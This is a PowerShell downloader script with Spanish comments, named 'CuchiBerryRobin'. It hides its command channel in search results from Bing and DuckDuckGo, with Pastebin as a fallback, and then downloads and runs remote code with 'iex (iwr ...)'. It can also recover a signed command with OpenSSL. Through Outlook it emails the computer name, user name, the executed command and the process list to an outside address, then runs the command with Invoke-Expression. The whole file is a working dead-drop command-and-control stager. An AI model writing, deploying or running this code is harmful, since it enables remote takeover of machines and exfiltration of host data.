#Downloader CUCHIBERRYROBIN
$Conf_Hashtag_init="#11CUCHIBERRYROBIN"
$Conf_Hashtag_end="#FIN"
$Conf_email="cuchirobin@trash-mail.com"
$resultado = $null

#Not working, need workaround to get from google 
#$content = Invoke-WebRequest -Uri "https://www.google.com/search?q=$Conf_Hashtag_init" -UseBasicParsing
#$patron = '(?<=$Conf_Hashtag_init )(.*)(?= $Conf_Hashtag_end)'
#$resultado = [regex]::Match($content.Content, $patron).Value
#$from="Google"
#Write-Output "Google $resultado "


#Bun BING WORKS!!! in 2023 in 2024 no
#Pero OPCION #TODO CIPHER XOR
#BING A VECES METE UN STRONG SERP,5184.2">#<strong>11CUCHIBERRYROBIN</strong> $ https://pastebin.com/raw/p3BF6kS4 #FIN</a></h2><

if (([string]::IsNullOrEmpty($resultado))) {
    $letras = -join ((65..90) + (97..122) | Get-Random -Count 6 | % { [char]$_ })
    $numero = Get-Random -Minimum 1 -Maximum 1000
    $conf_hashtag_init_encoded = [System.Uri]::EscapeDataString($Conf_Hashtag_init)
    $content = Invoke-WebRequest -Uri "https://www.bing.com/search?$letras=$numero&q=$conf_hashtag_init_encoded" -UseBasicParsing
    #elimino el strong
    $contentclean = $content.Content -replace "<strong>", "" -replace "</strong>", ""
    $patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
    $resultado = ($contentclean | Select-String -Pattern $patron -AllMatches).Matches[0].Value
    Write-Output "URL: https://www.bing.com/search?$letras=$numero&q=$conf_hashtag_init_encoded"
    Write-Output "BING $resultado "
    $from = "Bing"

}
#DUCK
#TODO CIPHER XOR
#Si no se ha encontrado resultado en las b�squedas anteriores
 
if (([string]::IsNullOrEmpty($resultado))) {
    #Generamos letras aleatorias para el par�metro de b�squeda
    $letras = -join ((65..90) + (97..122) | Get-Random -Count 6 | % { [char]$_ })
    #Generamos un n�mero aleatorio para el par�metro de b�squeda 
    $numero = Get-Random -Minimum 1 -Maximum 1000
    #Codificamos el hashtag para la URL
    $conf_hashtag_init_encoded = [System.Uri]::EscapeDataString($Conf_Hashtag_init)
    #Construimos la URL de b�squeda en DuckDuckGo
    $url = "https://html.duckduckgo.com/html/?$letras=$numero&q=%7B$Conf_Hashtag_init%7D&a=b"
    #Hacemos la petici�n web
    $content = Invoke-WebRequest -Uri $url -UseBasicParsing
    Write-Output "DUCK URL: $url"
    #Definimos el patr�n de b�squeda entre los hashtags
    $patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
    #Extraemos el resultado usando el patr�n
    $resultado = ($content | Select-String -Pattern $patron -AllMatches).Matches[0].Value
    #Guardamos la fuente como DuckDuckGo
    $from = "Duck"
 
}




#TerceraA OPCION #TODO CIPHER XOR
if (([string]::IsNullOrEmpty($resultado))) {
    $content = Invoke-WebRequest -Uri "https://pastebin.com/raw/ABiV0rH7" -UseBasicParsing
    $patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
    $resultado = [regex]::Match($content, $patron).Value
    $from = "Pastebin"

    Write-Output "PASTEBIN:"$resultado
}

$resultado = [System.Net.WebUtility]::HtmlDecode($resultado)



$Title = "CuchiBerryRObin"
$Message = "Descargando comando $resultado de $from"
$Type = "info" 
  
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10, $Title, $Message, [system.windows.forms.tooltipicon]::$Type)

#$resultado = " $ https://rentry.co/6vkoq/raw"
#$resultado = " �C https://pastebin.com/raw/R6sTE0GK"
#COMANDOS 
# $ httpimplica descargar y ejecutar script ejemplo $ https://pastebin.com/raw/ABiV0rH7
# �C implica firmado con openssl en URL �C https://pastebin.com/raw/R6sTE0GK


$patron = '\$\shttp[^\s]+'

#Si tiene $ implica descargar y ejecutar script
if ($resultado -match $patron) {
    $url = $matches[0] -replace '\$+', ''
    $resultado = "iex (iwr $url -UseBasicParsing).Content"
    Write-Output "Comando $ :"$resultado
}

# Buscar si el comando comienza con �C
$patron = '^�C\s'

# Si el comando comienza con �C, procesar como comando cifrado
if ($resultado -match $patron) {
    # Extraer el contenido posterior a "�C"
    $resultado = $resultado.Substring($posicion + 3) 
    $resultado = (iwr $resultado -UseBasicParsing).Content
    
    $archivoTemporal = [System.IO.Path]::GetTempFileName()
    [IO.File]::WriteAllBytes($archivoTemporal, [Convert]::FromBase64String($resultado))

    #VERIFICO SI TIENE INSTALADO EL OPENSSL
    # Verificar si OpenSSL est� instalado
    $opensslInstalled = Get-Command openssl -ErrorAction SilentlyContinue

    if (-not $opensslInstalled) { 
        winget install --id OpenSSL.OpenSSL
    }
    $resultado = openssl pkeyutl -verifyrecover -in $archivoTemporal  -inkey private.der

           

    $Title = "CuchiBerryRObin"
    $Message = "Descifrando comando Robin Cifrado"
    $Type = "info" 
  
    [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
    $path = Get-Process -id $pid | Select-Object -ExpandProperty Path
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
    $notify = new-object system.windows.forms.notifyicon
    $notify.icon = $icon
    $notify.visible = $true
    $notify.showballoontip(10, $Title, $Message, [system.windows.forms.tooltipicon]::$Type)
}

if (-not [string]::IsNullOrEmpty($Conf_email)) {
    $computerInfo = Get-WmiObject -Class Win32_ComputerSystem
    $computerName = $computerInfo.Name 
    $userName = $computerInfo.UserName

    $emailBody = @"
Informaci�n de ejecuci�n de comando $Conf_CharSet

Equipo: $computerName
Usuario: $userName
Origen del comando: $from
Comando ejecutado: $resultado
Procesos en ejecuci�n:
$(Get-Process | Select-Object ProcessName,Id,CPU,WorkingSet | Format-Table | Out-String)

"@

    try {
        $outlook = New-Object -ComObject Outlook.Application
        $mail = $outlook.CreateItem(0)
        $mail.To = $Conf_email
        $mail.Subject = "Reporte $Conf_CharSet - $computerName"
        $mail.Body = $emailBody
        $mail.Send()
        #[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) 
    }
    catch {
        Write-Output "Error al enviar email: $_"
    }
}

Write-Output "COMANDO:"$resultado


Invoke-Expression $resultado



